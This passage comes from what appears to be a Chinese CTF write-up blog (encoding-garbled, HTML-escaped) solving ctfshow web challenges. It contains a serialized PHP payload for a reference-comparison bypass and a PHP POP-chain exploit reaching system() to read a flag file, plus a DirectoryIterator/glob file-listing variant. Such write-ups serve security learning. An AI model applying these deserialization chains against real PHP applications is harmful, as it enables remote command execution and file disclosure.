&lt;span style="color:#00a8c8">die&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;&amp;lt;script&amp;gt;window.alert(&amp;#39;è¿™æ˜¯ä¸èƒ½è¯´çš„ç§˜å¯†&amp;#39;);location.href=&amp;#39;https://www.bilibili.com/video/BV1CW411g7UF&amp;#39;;&amp;lt;/script&amp;gt;&amp;#34;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#75af00">unserialize&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$secret&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">}&lt;/span>&lt;span style="color:#00a8c8">else&lt;/span>&lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#75af00">show_source&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#00a8c8">__FILE__&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>æ˜¯å‡ ä¸ªå°trickçš„åˆé›†ï¼Œä¸éš¾&lt;/p>
&lt;ul>
&lt;li>&lt;code>extract()&lt;/code>å¯ä»¥å˜é‡è¦†ç›–&lt;/li>
&lt;li>&lt;code>$this-&amp;gt;your_answer === $this-&amp;gt;name&lt;/code>è¿™æ ·çš„å¼ºæ¯”è¾ƒå¯ä»¥ç”¨æŒ‡é’ˆå–åœ°å€æ–¹å¼ç»•è¿‡&lt;/li>
&lt;/ul>
&lt;p>exp&lt;/p>
&lt;pre tabindex="0">&lt;code>$test = new whoami();
$test-&amp;gt;your_answer=&amp;amp;$test-&amp;gt;name;
echo serialize($test);
&lt;/code>&lt;/pre>&lt;p>payload&lt;/p>
&lt;pre tabindex="0">&lt;code>/?s=%E7%BB%99%E6%88%91%E7%9C%8B%E7%9C%8B%21
POST: secret=O%3A6%3A%22whoami%22%3A3%3A%7Bs%3A4%3A%22name%22%3Bs%3A19%3A%22ctfshow%E7%AC%AC%E4%B8%80%E6%B7%B1%E6%83%85%22%3Bs%3A11%3A%22your%5Fanswer%22%3BR%3A2%3Bs%3A7%3A%22useless%22%3Bs%3A8%3A%22I%5Flove%5Fu%22%3B%7D
&lt;/code>&lt;/pre>&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211111233756111.png" alt="image-20211111233756111">&lt;/p>
&lt;h2 id="è°æ˜¯ctfä¹‹çŽ‹">è°æ˜¯ctfä¹‹çŽ‹ï¼Ÿ&lt;/h2>
&lt;blockquote>
&lt;p>æ®è¯´è¾“å…¥æ¡†èƒ½è¿žèµ·æ¥çš„&lt;/p>
&lt;/blockquote>
&lt;p>f12å¯ä»¥çœ‹åˆ°æç¤º/ssti.html&lt;/p>
&lt;p>ç„¶åŽæ²¡å•¥å¯è¯´çš„ï¼ŒåŽŸé¢˜ï¼Œä¸€ç‚¹éƒ½æ²¡æ”¹ï¼Œç›´æŽ¥çœ‹ä¹‹å‰çš„åšå®¢-&amp;gt;&lt;a href="https://amiaaaz.github.io/2021/10/22/digitaloverdosectf2021-wp/#webmadlib">[DigitalOverdoseCTF 2021]madlib&lt;/a>&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211111235757667.png" alt="image-20211111235757667">&lt;/p>
&lt;p>yysyï¼Œçœ‹åˆ°è¿™ä¸ªhintæˆ‘å°±å·²ç»æ„è¯†åˆ°æ˜¯åœ¨è€ƒè¿™ä¸ªé¢˜äº†ï¼Œæžœç„¶ï¼Œæ²¡æ‹¿ä¸Šä¸€è¡€å¯æƒœäº†&lt;/p>
&lt;h2 id="easypop">easypop&lt;/h2>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-php" data-lang="php">&lt;span style="color:#f92672">&amp;lt;?&lt;/span>&lt;span style="color:#75af00">php&lt;/span>
&lt;span style="color:#75af00">highlight_file&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#00a8c8">__FILE__&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#75af00">error_reporting&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">action_1&lt;/span>&lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#111">$tmp&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#111">$fun&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#39;system&amp;#39;&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#111">__call&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$wo&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#111">$jia&lt;/span>&lt;span style="color:#111">){&lt;/span>
&lt;span style="color:#75af00">call_user_func&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">fun&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#111">__wakeup&lt;/span>&lt;span style="color:#111">(){&lt;/span>
&lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">fun&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#39;&amp;#39;&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#00a8c8">die&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;é˜¿ç¥–æ”¶æ‰‹å§ï¼Œå¤–é¢æœ‰å¥—ç¥ž&amp;#34;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#111">__toString&lt;/span>&lt;span style="color:#111">(){&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">tmp&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">str&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">action_2&lt;/span>&lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#111">$p&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#111">$tmp&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#75af00">getFlag&lt;/span>&lt;span style="color:#111">(){&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">isset&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$_GET&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;ctfshow&amp;#39;&lt;/span>&lt;span style="color:#111">]))&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">tmp&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">$_GET&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;ctfshow&amp;#39;&lt;/span>&lt;span style="color:#111">];&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#75af00">system&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;cat /&amp;#34;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">tmp&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#111">__call&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$wo&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#111">$jia&lt;/span>&lt;span style="color:#111">){&lt;/span>
&lt;span style="color:#75af00">phpinfo&lt;/span>&lt;span style="color:#111">();&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#111">__wakeup&lt;/span>&lt;span style="color:#111">(){&lt;/span>
&lt;span style="color:#00a8c8">echo&lt;/span> &lt;span style="color:#d88200">&amp;#34;&amp;lt;br&amp;gt;&amp;#34;&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#00a8c8">echo&lt;/span> &lt;span style="color:#d88200">&amp;#34;phpç‰ˆæœ¬7.3å“¦ï¼Œæ²¡æœ‰äººå¯ä»¥å†ç»•è¿‡æˆ‘äº†&amp;#34;&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#00a8c8">echo&lt;/span> &lt;span style="color:#d88200">&amp;#34;&amp;lt;br&amp;gt;&amp;#34;&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#111">__get&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$key&lt;/span>&lt;span style="color:#111">){&lt;/span>
&lt;span style="color:#111">$function&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">p&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">$function&lt;/span>&lt;span style="color:#111">();&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">action_3&lt;/span>&lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#111">$str&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#111">$tmp&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#111">$ran&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#111">__construct&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$rce&lt;/span>&lt;span style="color:#111">){&lt;/span>
&lt;span style="color:#00a8c8">echo&lt;/span> &lt;span style="color:#d88200">&amp;#34;é€ç»™ä½ äº†&amp;#34;&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#75af00">system&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$rce&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#111">__destruct&lt;/span>&lt;span style="color:#111">(){&lt;/span>
&lt;span style="color:#75af00">urlencode&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">str&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#111">__get&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$jia&lt;/span>&lt;span style="color:#111">){&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">preg_match&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;/action_2/&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#75af00">get_class&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">ran&lt;/span>&lt;span style="color:#111">))){&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#d88200">&amp;#34;å•¥ä¹Ÿæ²¡æœ‰&amp;#34;&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">ran&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#111">$jia&lt;/span>&lt;span style="color:#111">();&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">action_4&lt;/span>&lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#111">$ctf&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#111">$show&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#111">$jia&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#111">__destruct&lt;/span>&lt;span style="color:#111">(){&lt;/span>
&lt;span style="color:#111">$jia&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">jia&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#00a8c8">echo&lt;/span> &lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">ran&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#111">$jia&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#75af00">append&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$ctf&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#111">$show&lt;/span>&lt;span style="color:#111">){&lt;/span>
&lt;span style="color:#00a8c8">echo&lt;/span> &lt;span style="color:#d88200">&amp;#34;&amp;lt;br&amp;gt;&amp;#34;&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#00a8c8">echo&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">$ctf&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$show&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#111">__invoke&lt;/span>&lt;span style="color:#111">(){&lt;/span>
&lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">append&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">ctf&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">show&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">isset&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$_GET&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;pop&amp;#39;&lt;/span>&lt;span style="color:#111">])){&lt;/span>
&lt;span style="color:#111">$pop&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">$_GET&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;pop&amp;#39;&lt;/span>&lt;span style="color:#111">];&lt;/span>
&lt;span style="color:#111">$output&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">unserialize&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$pop&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">preg_match&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;/php/&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#111">$output&lt;/span>&lt;span style="color:#111">)){&lt;/span>
&lt;span style="color:#00a8c8">echo&lt;/span> &lt;span style="color:#d88200">&amp;#34;å¥—ç¥žé»‘è¿›è¿™é‡Œå¹¶ç»™ä½ äº†ä¸€ä¸ªæç¤ºï¼šæ–‡ä»¶åæ˜¯få¼€å¤´çš„å½¢å¦‚fA6_å½¢å¼çš„æ–‡ä»¶&amp;#34;&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#00a8c8">die&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;ä¸å¯ä»¥ç”¨ä¼ªåè®®å“¦&amp;#34;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>å…ˆç›´æŽ¥æ”¾payloadæŠŠï¼Œç›´æŽ¥ç”¨çš„action_3çš„rce&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-php" data-lang="php">&lt;span style="color:#f92672">&amp;lt;?&lt;/span>&lt;span style="color:#75af00">php&lt;/span>
&lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">action_4&lt;/span>&lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#111">__construct&lt;/span>&lt;span style="color:#111">(){&lt;/span>
&lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">ctf&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#39;action_3&amp;#39;&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">show&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#39;cat /fz3_.txt&amp;#39;&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">action_2&lt;/span>&lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#111">__construct&lt;/span>&lt;span style="color:#111">(){&lt;/span>
&lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">p&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">action_4&lt;/span>&lt;span style="color:#111">();&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">action_1&lt;/span>&lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#111">__construct&lt;/span>&lt;span style="color:#111">(){&lt;/span>
&lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">tmp&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">action_2&lt;/span>&lt;span style="color:#111">();&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">action_3&lt;/span>&lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#111">__construct&lt;/span>&lt;span style="color:#111">(){&lt;/span>
&lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">str&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">action_1&lt;/span>&lt;span style="color:#111">();&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">echo&lt;/span> &lt;span style="color:#75af00">serialize&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">action_3&lt;/span>&lt;span style="color:#111">());&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>è¿™ä¸ªåº”è¯¥æ¯”è¾ƒç®€å•ï¼Œä¸ç”¨åˆ†æžéƒ½èƒ½çœ‹æ˜Žç™½&lt;/p>
&lt;p>å®˜æ–¹wpçš„é¢„æœŸè§£é•¿è¿™æ ·-&amp;gt;&lt;a href="https://qgieod1s9b.feishu.cn/docs/doccnNEAk0zZJDhi7bypQhF6eFf#Nb2X8y">wp&lt;/a>ï¼Œé¦–å…ˆç”¨åˆ°äº†phpçš„å†…ç½®ç±»DirectoryIteratoré…åˆglobä¼ªåè®®çˆ†ç ´flagæ–‡ä»¶å&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-php" data-lang="php">&lt;span style="color:#f92672">&amp;lt;?&lt;/span>&lt;span style="color:#75af00">php&lt;/span>
&lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">action_4&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#111">__construct&lt;/span>&lt;span style="color:#111">(){&lt;/span>
&lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">ctf&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#34;DirectoryIterator&amp;#34;&lt;/span>&lt;span style="color:#111">;&lt;/span> &lt;span style="color:#75715e">//GlobIterator
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">show&lt;/span> &lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#34;glob:///f[A-z][0-9]_*&amp;#34;&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">action_3&lt;/span>&lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#111">__construct&lt;/span>&lt;span style="color:#111">(){&lt;/span>
&lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">str&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">action_1&lt;/span>&lt;span style="color:#111">();&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">action_1&lt;/span>&lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#111">__construct&lt;/span>&lt;span style="color:#111">(){&lt;/span>
&lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">tmp&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">action_2&lt;/span>&lt;span style="color:#111">();&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">action_2&lt;/span>&lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#111">__construct&lt;/span>&lt;span style="color:#111">(){&lt;/span>
&lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">p&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">action_4&lt;/span>&lt;span style="color:#111">();&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">echo&lt;/span> &lt;span style="color:#75af00">serialize&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">action_3&lt;/span>&lt;span style="color:#111">());&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>è¿™ä¸ªç¡®å®žï¼Œä½†æ˜¯ä¹‹åŽçš„&lt;code>call_user_func&lt;/code>ï¼Œæˆ‘åªèƒ½è¯´ æœ‰ä¸€è¯´ä¸€ æˆ‘æ˜¯æ²¡å¤çŽ°æˆåŠŸ&lt;/p>
&lt;p>è¿™é‡Œçš„æ­»äº¡wakeupæ°¸è¿œä¼šæ¯”callå…ˆè°ƒç”¨ï¼Œfuncè¿™é‡Œè¿˜æ²¡åˆ°call_user_funcå°±å…ˆè¢«æ¸…ç©ºäº†ï¼Œæ€Žä¹ˆæ‰§è¡Œï¼Ÿï¼Ÿï¼Ÿ&lt;/p>
&lt;h2 id="è¿‘åœ¨çœ¼å‰">è¿‘åœ¨çœ¼å‰&lt;/h2>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#75715e">#!/usr/bin/env python3&lt;/span>
&lt;span style="color:#f92672">from&lt;/span> &lt;span style="color:#111">flask&lt;/span> &lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">Flask&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">render_template_string&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">request&lt;/span>
&lt;span style="color:#f92672">from&lt;/span> &lt;span style="color:#111">flask_limiter&lt;/span> &lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">Limiter&lt;/span>
&lt;span style="color:#f92672">from&lt;/span> &lt;span style="color:#111">flask_limiter.util&lt;/span> &lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">get_remote_address&lt;/span>
